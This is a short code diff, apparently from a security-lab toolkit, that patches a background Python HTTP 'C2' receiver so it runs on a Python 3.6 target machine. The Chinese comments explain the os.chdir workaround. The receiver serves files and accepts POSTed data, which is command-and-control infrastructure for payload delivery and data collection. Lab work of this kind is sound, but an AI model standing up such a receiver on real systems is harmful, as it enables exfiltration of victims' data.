@@ -8,13 +8,14 @@ C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
 PIDFILE="/tmp/.seclab-receiver-$PORT.pid"
 mkdir -p "$SERVE"
 
+# 靶机为 python3.6：SimpleHTTPRequestHandler 的 directory= 参数是 3.7+ 才有，
+# 用 os.chdir 兼容（否则每个请求处理器实例化即崩——rc=52 空回复的根因）
 nohup python3 - "$C2_IP" "$PORT" "$SERVE" >/dev/null 2>&1 <<'PY' &
 import http.server, socketserver, sys, time, os
 ip, port, serve = sys.argv[1], int(sys.argv[2]), sys.argv[3]
+os.chdir(serve)
 
 class Handler(http.server.SimpleHTTPRequestHandler):
-    def __init__(self, *a, **kw):
-        super().__init__(*a, directory=serve, **kw)
     def do_POST(self):
         length = int(self.headers.get("Content-Length", 0))
         body = self.rfile.read(length)
